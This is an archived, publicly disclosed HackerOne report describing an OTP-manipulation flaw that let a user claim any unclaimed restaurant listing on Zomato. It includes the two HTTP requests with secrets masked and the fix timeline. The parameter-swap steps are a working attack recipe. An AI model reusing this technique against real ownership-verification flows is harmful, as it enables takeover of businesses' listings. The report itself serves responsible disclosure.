---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/improper-authorization
  - env/web
substate: "resolved"
weakness: "Improper Authorization"
enriched: true
body: true
date: 2022-02-22
submitted: 2021-09-05T07:32:05.745Z
bounty_usd: 3250
votes: 108
cve: []
program: "[[programs/eternal|Eternal]]"
reporter: "ashoka_rao"
source: "https://hackerone.com/reports/1330529"
title: "Claiming the listing of a non-delivery restaurant through OTP manipulation"
---
# Claiming the listing of a non-delivery restaurant through OTP manipulation

> **Severity:** Critical | **Bounty:** 3,250 USD | **Votes:** 108 | **Program:** Eternal | **Disclosed:** 2022-02-22

- Report: [https://hackerone.com/reports/1330529](https://hackerone.com/reports/1330529)
- CWE: Improper Authorization
- Submitted: 2021-09-05T07:32:05.745Z

## Report summary

Thanks to @ashoka_rao for reporting this issue. The Researcher demonstrated a way to takeover an unclaimed non-delivery restaurant on our platform.

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

**Summary:** Am able to claim any restaurant which is not claimed before.

**Description:** An endpoint `POST /restaurant-onboard-diy/v2/send-auto-claim-otp HTTP/2` sends OTP to the restaurant mobile no.

##Request (Request:1) is - 
```
POST /restaurant-onboard-diy/v2/send-auto-claim-otp HTTP/2
Host: www.zomato.com
Cookie: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
Content-Length: 58
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="90"
Accept: application/json, text/plain, */*
X-Zomato-Csrft: XXXXXXXXXXXXXXXXXXXXXXX
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
Content-Type: application/json;charset=UTF-8
Origin: https://www.zomato.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://www.zomato.com/partner_with_us/ownership
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{"number":"XXXXXXXXXX","isdCode":"+91","resId":"XXXXXXXXXX"}
```
which responses -
```
{"status":"success","message":"OTP SENT","requestId":XXXXXXX,"code":2}
```

###Here Attacker gains OTP on his own mobile no by changing the `number` & `resId` to his own restaurant.

By using the following request (Request:2) attacker is able to map his e-mail Id as `Owner / Manager` to Victim restaurant.
##Request:2
```
POST /restaurant-onboard-diy/v2/verify-auto-claim-otp HTTP/2
Host: www.zomato.com
Cookie: XXXXXXXXXXXXXXXX
Content-Length: 68
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="90"
Accept: application/json, text/plain, */*
X-Zomato-Csrft: XXXXXXXXXXXXXXXXXXXXX
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
Content-Type: application/json;charset=UTF-8
Origin: https://www.zomato.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://www.zomato.com/partner_with_us/ownership
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{"verificationCode":XXX,"requestId":"XXXXXXXX","resId":"XXXXXXXXX"}
```

###Here by changing the `verificationCode`  -  (Otp received on Attacker Mobile in response of Request :1 )& `requestId`  (Response of request:1) and `resId` to Victim Restaurant. Request:2 maps e-mail id of Attacker to Victim restaurant.

**Prerequisite - Attacker should have a restaurant page, mapped Mobile No With Email Id.**

**Note : -  If any restaurant is not mapped owner / manager then claimed restaurant can be claimed **

## Impact

Claim a restaurant.

## Timeline

- **Report Filed**
- **2021-09-05** @bhelpuri: Hi @ashoka_rao ,

We are getting this checked. Will get back to you once we have an update.

Can you share the res ids that you were able to takeover using the method you shared ?

Thanks,
@bhelpuri
- **2021-09-05** @ashoka_rao: Hi, @bhelpuri 

Kindly check for **res_id : ████**
- **Report Severity Updated**
- **Report Triaged**
- **Bounty Awarded**
- **Bounty Awarded**
- **2021-09-21** @ashoka_rao: Hi,

Thanks a lot for bounty & bonus.

@ashoka_rao
- **2021-09-22** @panipuri: Hi @ashoka_rao,

We have deployed a fix for this report. Could you please check and confirm?

Thanks,
@panipuri
- **Report Needs More Info**
- **Report Resolved**
- **Agreed On Going Public**
- **Report Title Updated**
- **Agreed On Going Public**
- **Report Became Public**
